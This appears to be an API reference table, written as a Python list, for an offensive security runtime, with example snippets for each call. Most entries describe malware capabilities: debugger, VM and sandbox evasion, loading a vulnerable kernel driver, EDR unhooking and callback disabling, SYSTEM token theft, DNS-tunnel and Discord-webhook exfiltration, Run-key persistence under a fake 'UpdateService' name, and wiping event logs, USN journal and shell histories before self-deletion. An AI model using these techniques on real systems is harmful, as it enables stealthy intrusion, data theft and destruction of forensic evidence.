RUNTIME_APIS = [
    {
        "category": "Anti-Analysis",
        "platform": "all",
        "apis": [
            {
                "name": "jocky_check_analysis_environment",
                "signature": "jocky_check_analysis_environment() -> i32",
                "description": "Performs comprehensive environment analysis — checks for debuggers, VMs, and sandboxes in a single call",
                "snippet": 'let result: i32 = jocky_check_analysis_environment()\nif result != 0 {\n    println("Analysis environment detected, aborting")\n    exit(1)\n}',
            },
            {
                "name": "jocky_is_debugger_present",
                "signature": "jocky_is_debugger_present() -> i32",
                "description": "Checks for attached debuggers using multiple detection vectors",
                "snippet": 'if jocky_is_debugger_present() {\n    println("Debugger detected")\n    exit(1)\n}',
            },
            {
                "name": "jocky_is_vm",
                "signature": "jocky_is_vm() -> i32",
                "description": "Detects virtual machine environments via CPUID, MAC address, and registry artifacts",
                "snippet": 'if jocky_is_vm() {\n    println("Virtual machine detected")\n    jocky_sleep_and_recheck()\n}',
            },
            {
                "name": "jocky_is_sandbox",
                "signature": "jocky_is_sandbox() -> i32",
                "description": "Identifies sandbox environments by checking process count, uptime, and user interaction",
                "snippet": 'if jocky_is_sandbox() {\n    println("Sandbox environment detected")\n    exit(0)\n}',
            },
            {
                "name": "jocky_sleep_and_recheck",
                "signature": "jocky_sleep_and_recheck() -> void",
                "description": "Sleeps for a randomized interval then re-runs analysis checks to evade time-based sandbox detection",
                "snippet": "jocky_sleep_and_recheck()",
            },
        ],
    },
    {
        "category": "BYOVD",
        "platform": "windows",
        "apis": [
            {
                "name": "byovd_load_driver",
                "signature": "byovd_load_driver(name: string) -> i64",
                "description": "Loads a vulnerable kernel driver by name from the built-in driver chain",
                "snippet": 'let handle: i64 = byovd_load_driver("rtkiow10x64.sys")\nif handle > 0 {\n    println("Driver loaded, handle: " + string(handle))\n}',
            },
            {
                "name": "byovd_test_exploit",
                "signature": "byovd_test_exploit(handle: i64) -> i32",
                "description": "Verifies that kernel read/write primitives work through the loaded driver",
                "snippet": 'let result: i32 = byovd_test_exploit(handle)\nif result == 0 {\n    println("Exploit verified — kernel access obtained")\n}',
            },
            {
                "name": "btr_mask_module",
                "signature": "btr_mask_module(module: string) -> void",
                "description": "Hides a loaded module from PEB enumeration using BTR driver primitives",
                "snippet": 'btr_mask_module("ntdll.dll")\nbtr_mask_module("kernel32.dll")',
            },
            {
                "name": "btr_disable_notifications",
                "signature": "btr_disable_notifications() -> void",
                "description": "Disables kernel callback notifications for process/thread/image events",
                "snippet": "btr_disable_notifications()\nprintln(\"Kernel notifications disabled\")",
            },
        ],
    },
    {
        "category": "Evasion",
        "platform": "windows",
        "apis": [
            {
                "name": "blindside_unhook_ntdll",
                "signature": "blindside_unhook_ntdll() -> void",
                "description": "Restores ntdll.dll from disk to remove EDR inline hooks using hardware breakpoints",
                "snippet": 'blindside_unhook_ntdll()\nprintln("NTDLL unhooked via BlindSide technique")',
            },
            {
                "name": "edrhoker_detect",
                "signature": "edrhoker_detect() -> void",
                "description": "Scans for EDR hooking patterns and identifies which security product is active",
                "snippet": 'edrhoker_detect()\nprintln("EDR detection scan complete")',
            },
        ],
    },
    {
        "category": "Crypto",
        "platform": "all",
        "apis": [
            {
                "name": "crypto_generate_key",
                "signature": "crypto_generate_key(size: i32) -> i8*",
                "description": "Generates a cryptographically secure random key of the specified byte length",
                "snippet": "let key: i8* = crypto_generate_key(32)\nprintln(\"AES-256 key generated\")",
            },
            {
                "name": "crypto_aes256_encrypt",
                "signature": "crypto_aes256_encrypt(data: i8*, key: i8*) -> i8*",
                "description": "Encrypts data buffer using AES-256-CBC with PKCS7 padding",
                "snippet": 'let plaintext: i8* = fs_read_file("/tmp/data.bin")\nlet key: i8* = crypto_generate_key(32)\nlet encrypted: i8* = crypto_aes256_encrypt(plaintext, key)',
            },
        ],
    },
    {
        "category": "Exfiltration",
        "platform": "all",
        "apis": [
            {
                "name": "exfil_dns_tunnel",
                "signature": "exfil_dns_tunnel(domain: string, data: string) -> i32",
                "description": "Exfiltrates data by encoding it into DNS TXT record queries to a controlled domain",
                "snippet": 'let result: i32 = exfil_dns_tunnel("c2.research.internal", "encoded_payload")\nif result == 0 {\n    println("DNS tunnel delivery successful")\n}',
            },
            {
                "name": "exfil_discord_webhook",
                "signature": "exfil_discord_webhook(url: string, message: string) -> i32",
                "description": "Sends data to a Discord webhook URL as a message payload",
                "snippet": 'let webhook: string = "https://discord.com/api/webhooks/ID/TOKEN"\nlet result: i32 = exfil_discord_webhook(webhook, "Research data payload")\nif result == 0 {\n    println("Discord webhook delivered")\n}',
            },
            {
                "name": "exfil_local_cdn",
                "signature": "exfil_local_cdn(endpoint: string, payload_id: string, auth_token: string, metadata: string) -> i32",
                "description": "Uploads encrypted payload to a local Caddy-based CDN with TLS mutual authentication",
                "snippet": 'let result: i32 = exfil_local_cdn(\n    "https://research.internal:8443/upload",\n    "payload_001",\n    "Bearer secure_token",\n    "threat=0.3:drivers=1"\n)\nif result == 0 {\n    println("CDN upload successful")\n}',
            },
        ],
    },
    {
        "category": "Forensics",
        "platform": "windows",
        "apis": [
            {
                "name": "forensics_wipe_powershell_history",
                "signature": "forensics_wipe_powershell_history() -> void",
                "description": "Clears PowerShell command history file (ConsoleHost_history.txt)",
                "snippet": "forensics_wipe_powershell_history()\nprintln(\"PowerShell history wiped\")",
            },
            {
                "name": "forensics_wipe_cmd_history",
                "signature": "forensics_wipe_cmd_history() -> void",
                "description": "Clears Windows Command Prompt history buffer",
                "snippet": "forensics_wipe_cmd_history()\nprintln(\"CMD history wiped\")",
            },
            {
                "name": "forensics_clear_dns_cache",
                "signature": "forensics_clear_dns_cache() -> void",
                "description": "Flushes the Windows DNS resolver cache",
                "snippet": "forensics_clear_dns_cache()",
            },
            {
                "name": "forensics_flush_arp_cache",
                "signature": "forensics_flush_arp_cache() -> void",
                "description": "Purges the ARP table to remove network neighbor entries",
                "snippet": "forensics_flush_arp_cache()",
            },
            {
                "name": "jocky_cleanup_event_logs",
                "signature": 'jocky_cleanup_event_logs(logs: string) -> void',
                "description": "Clears specified Windows Event Log channels (comma-separated)",
                "snippet": 'jocky_cleanup_event_logs("Application,Security,System")\nprintln("Event logs cleared")',
            },
            {
                "name": "jocky_cleanup_usn_journal",
                "signature": "jocky_cleanup_usn_journal() -> void",
                "description": "Deletes the NTFS USN change journal to remove file change tracking data",
                "snippet": "jocky_cleanup_usn_journal()\nprintln(\"USN journal cleared\")",
            },
            {
                "name": "jocky_self_delete",
                "signature": "jocky_self_delete() -> void",
                "description": "Schedules the running binary for deletion upon process exit",
                "snippet": "jocky_self_delete()\nprintln(\"Self-deletion scheduled\")",
            },
        ],
    },
    {
        "category": "Forensics",
        "platform": "linux",
        "apis": [
            {
                "name": "linux_forensics_wipe_bash_history",
                "signature": "linux_forensics_wipe_bash_history() -> void",
                "description": "Clears bash command history file and in-memory history buffer",
                "snippet": "linux_forensics_wipe_bash_history()\nprintln(\"Bash history wiped\")",
            },
            {
                "name": "jocky_linux_cleanup_journal",
                "signature": "jocky_linux_cleanup_journal() -> void",
                "description": "Vacuums systemd journal logs to remove forensic traces",
                "snippet": "jocky_linux_cleanup_journal()\nprintln(\"Journal logs cleaned\")",
            },
            {
                "name": "jocky_linux_cleanup_syslog",
                "signature": "jocky_linux_cleanup_syslog() -> void",
                "description": "Truncates syslog and auth.log files",
                "snippet": "jocky_linux_cleanup_syslog()\nprintln(\"Syslog cleaned\")",
            },
        ],
    },
    {
        "category": "AI/ML Runtime",
        "platform": "all",
        "apis": [
            {
                "name": "ai_init",
                "signature": "ai_init() -> void",
                "description": "Initializes the ML inference engine with the bundled threat assessment model",
                "snippet": "ai_init()\nprintln(\"AI engine initialized\")",
            },
            {
                "name": "ai_collect_telemetry",
                "signature": "ai_collect_telemetry() -> void",
                "description": "Gathers system telemetry data — running processes, loaded modules, network connections",
                "snippet": "ai_collect_telemetry()\nprintln(\"Telemetry collected\")",
            },
            {
                "name": "ai_score_threat",
                "signature": "ai_score_threat() -> f64",
                "description": "Runs the ML model on collected telemetry and returns a threat score from 0.0 to 1.0",
                "snippet": 'let score: f64 = ai_score_threat()\nprintln("Threat score: " + string(score))\nif score > 0.8 {\n    println("CRITICAL threat level")\n}',
            },
        ],
    },
    {
        "category": "Sandbox",
        "platform": "all",
        "apis": [
            {
                "name": "sandbox_spawn",
                "signature": "sandbox_spawn(cmd: string, args: string) -> i64",
                "description": "Spawns a sandboxed child process with configurable resource limits",
                "snippet": 'let pid: i64 = sandbox_spawn("/bin/bash", "-c \'ls -la /tmp\'")\nif pid > 0 {\n    println("Sandbox PID: " + string(pid))\n}',
            },
            {
                "name": "sandbox_set_limits",
                "signature": "sandbox_set_limits(pid: i64, mem: i64, time: i64, disk: i64) -> void",
                "description": "Sets memory (bytes), CPU time (ms), and disk (bytes) limits on a sandbox process",
                "snippet": "sandbox_set_limits(pid, 256 * 1024 * 1024, 120000, 100 * 1024 * 1024)",
            },
            {
                "name": "sandbox_monitor",
                "signature": "sandbox_monitor(pid: i64) -> i32",
                "description": "Monitors sandbox process for anomalies and resource limit violations",
                "snippet": "let anomaly: i32 = sandbox_monitor(pid)\nif anomaly != 0 {\n    println(\"Sandbox anomaly detected\")\n}",
            },
            {
                "name": "sandbox_wait",
                "signature": "sandbox_wait(pid: i64) -> void",
                "description": "Blocks until the sandbox process completes execution",
                "snippet": "sandbox_wait(pid)\nprintln(\"Sandbox process completed\")",
            },
            {
                "name": "sandbox_export_trace",
                "signature": "sandbox_export_trace(pid: i64, path: string) -> void",
                "description": "Exports the full syscall trace log of the sandbox session to a file",
                "snippet": 'sandbox_export_trace(pid, "/tmp/sandbox_trace.bin")\nprintln("Trace exported")',
            },
        ],
    },
    {
        "category": "Plugin",
        "platform": "all",
        "apis": [
            {
                "name": "plugin_load",
                "signature": "plugin_load(path: string) -> i64",
                "description": "Loads a shared library plugin (.so/.dll) and returns a handle",
                "snippet": 'let handle: i64 = plugin_load("/opt/plugins/edr_silence.so")\nif handle > 0 {\n    println("Plugin loaded")\n}',
            },
            {
                "name": "plugin_run",
                "signature": "plugin_run(handle: i64, args: string) -> void",
                "description": "Invokes the plugin's entry point with the given argument string",
                "snippet": 'plugin_run(handle, "--max-aggression")\nprintln("Plugin executed")',
            },
        ],
    },
    {
        "category": "Audit",
        "platform": "all",
        "apis": [
            {
                "name": "audit_init",
                "signature": "audit_init(capacity: i32) -> void",
                "description": "Initializes the hash-chained audit log with the specified entry capacity",
                "snippet": "audit_init(1000)\nprintln(\"Audit system initialized\")",
            },
            {
                "name": "audit_log",
                "signature": "audit_log(category: string, action: string, detail: string, result: string) -> void",
                "description": "Appends a hash-chained entry to the audit trail",
                "snippet": 'audit_log("operation", "file_access", "/etc/shadow", "success")',
            },
            {
                "name": "audit_verify",
                "signature": "audit_verify() -> i32",
                "description": "Verifies the integrity of the entire audit chain (returns 0 on success)",
                "snippet": 'let valid: i32 = audit_verify()\nif valid == 0 {\n    println("Audit trail integrity verified")\n}',
            },
            {
                "name": "audit_export",
                "signature": "audit_export(path: string) -> void",
                "description": "Exports the full audit trail to a binary file for offline analysis",
                "snippet": 'audit_export("/tmp/audit_trail.bin")\nprintln("Audit trail exported")',
            },
        ],
    },
    {
        "category": "Registry",
        "platform": "windows",
        "apis": [
            {
                "name": "jocky_registry_create_key",
                "signature": "jocky_registry_create_key(root: i64, path: string, handle: i8*) -> bool",
                "description": "Creates or opens a Windows registry key under the specified root hive",
                "snippet": 'let handle: i8* = jocky_alloc(256)\nlet ok: bool = jocky_registry_create_key(0x80000002, "Software\\\\Microsoft\\\\Windows\\\\Run", handle)\nif ok {\n    println("Registry key created")\n}',
            },
            {
                "name": "jocky_registry_set_value",
                "signature": "jocky_registry_set_value(handle: i8*, name: string, value: string, size: i32, type_: i32) -> void",
                "description": "Sets a named value on an open registry key",
                "snippet": 'jocky_registry_set_value(handle, "UpdateService", "C:\\\\ProgramData\\\\svc.exe", 32, 1)',
            },
            {
                "name": "jocky_registry_close_key",
                "signature": "jocky_registry_close_key(handle: i8*) -> void",
                "description": "Closes an open registry key handle",
                "snippet": "jocky_registry_close_key(handle)\njocky_free(handle)",
            },
        ],
    },
    {
        "category": "Exploitation",
        "platform": "windows",
        "apis": [
            {
                "name": "jocky_exploit_token_replacement",
                "signature": "jocky_exploit_token_replacement(pid: i32, token: i32) -> void",
                "description": "Replaces the process token with SYSTEM token for privilege escalation",
                "snippet": 'jocky_exploit_token_replacement(0, 0)\nprintln("Token replaced with SYSTEM")',
            },
            {
                "name": "jocky_exploit_disable_callbacks",
                "signature": "jocky_exploit_disable_callbacks() -> void",
                "description": "Disables kernel EDR callback routines registered via PsSetCreateProcessNotifyRoutine",
                "snippet": 'jocky_exploit_disable_callbacks()\nprintln("EDR kernel callbacks disabled")',
            },
        ],
    },
]
